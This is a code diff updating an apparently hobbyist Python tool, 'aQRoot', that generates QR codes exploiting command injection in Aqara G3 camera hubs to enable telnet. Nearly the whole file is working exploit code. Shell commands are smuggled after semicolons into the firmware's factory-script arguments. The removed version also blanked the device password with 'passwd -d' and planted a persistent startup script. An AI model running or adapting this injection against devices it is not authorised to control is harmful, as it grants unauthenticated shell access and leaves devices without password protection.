@@ -4,46 +4,40 @@ import segno
 
 __title__ = "aQRoot"
 __desc__ = "Enable telnet via qrcode command injection for Aqara G3 hub"
-__version__ = "0.3"
+__version__ = "0.4"
 __author__ = "Gareth Bryan"
 __license__ = "MIT"
 
 
-def cipher(data):
-    out = ""
-    for c in data.encode():
-        if 32 <= c <= 35:
-            out += '%c%c' % (c, c)
-        elif c <= 126:
-            out += '%c' % (162 - c)
-        elif c <= 128:
-            out += '#%c' % (165 - c)
-        elif c <= 208:
-            out += '!%c' % (164 + c & 0xff)
-        else:
-            out += '"%c' % (83 + c & 0xff)
-    return out
-
-
-def generate_payload(ssid, pwd, payload, post_init):
+def generate_payload(model, payload):
     """
     qrcode buffer is [1024]
-    nslookup sprintf buffer [132]
-    "nslookup a;<payload>0x00"
+    "fw_factory.sh <ss> <pp>"
     """
-    payload.insert(0, 'a')
+    arg_max_len = 123
+    payload_max_len = 1023
+
+    append = lambda s, c: (s or ";") + ("" if (s or ";") == ";" else ";") + c
+
+    ss, pp = ";", ""
+    for cmd in payload:
+        if len(s_try := append(ss, cmd)) <= arg_max_len:
+            ss = s_try
+        elif len(p_try := append(pp, cmd)) <= arg_max_len:
+            pp = p_try
+        else:
+            raise ValueError(f"command won't fit in either field (limit {arg_max_len}): {cmd!r}")
+
     qrcode_data = {
-        "b": "\\n".join(post_init),
-        "d": ";".join(payload),
-        "x": cipher(ssid),
-        "y": cipher(pwd),
-        "l": "en",
+        "vv": "1",
+        "mm": f"lumi.camera.{model}",
+        "ss": ss,
+        "pp": pp,
     }
     payload_string = "&".join([f"{k}={v}" for k, v in qrcode_data.items()])
-    if len(qrcode_data['d']) > 121:
-        raise ValueError(f"Payload (d) exceeds buffer {len(qrcode_data['d'])}/122")
-    if len(payload_string) > 1023:
-        raise ValueError(f"Payload string exceeds qrcode buffer {len(payload_string)}/1024")
+    #print(payload_string)
+    if len(payload_string) > payload_max_len:
+        raise ValueError(f"payload exceeds {len(payload_string)}/{payload_max_len}")
     return payload_string
 
 
@@ -57,20 +51,12 @@ def gen_qrcode(data, outfile=None):
 def main(args):
     try:
         data = generate_payload(
-            ssid=args.ssid,
-            pwd=args.pwd,
-            payload=[
-                'y=/data/scripts/post_init.sh',
-                '"fw_man"ager.sh -t -f',
-                'echo -e `agetprop persist.app.bind_key`>$y',
-                'tail -n2 $y|sh',
-            ],
-            post_init = [
-                '#!/bin/sh',
-                'fw_manager.sh -r',
-                'passwd -d $USER',
-                'fw_manager.sh -t -k'
-            ],
+            model=args.model,
+            payload= [
+                f"/usr/factory_test/bin/wifi_test_station.sh '{args.ssid}' '{args.pwd}' {args.algo}",
+                "echo 1 > /sys/class/gpio/gpio49/value",
+                "fw_manager.sh -t -k",
+            ]
         )
         gen_qrcode(data, args.filename)
     except ValueError as e:
@@ -83,6 +69,12 @@ if __name__ == "__main__":
         formatter_class=argparse.RawTextHelpFormatter,
     )
     parser.add_argument(
+        "model",
+        help="Camera model",
+        choices=["gwpgl1","gwpagl01"]
+    )
+
+    parser.add_argument(
         "ssid",
         help="Wireless SSID",
     )
@@ -90,6 +82,12 @@ if __name__ == "__main__":
         "pwd",
         help="Wireless Password"
     )
+
+    parser.add_argument(
+        "algo",
+        help="Wireless Algo (e.g wpa2)"
+    )
+
     parser.add_argument(
         "filename",
         nargs="?",
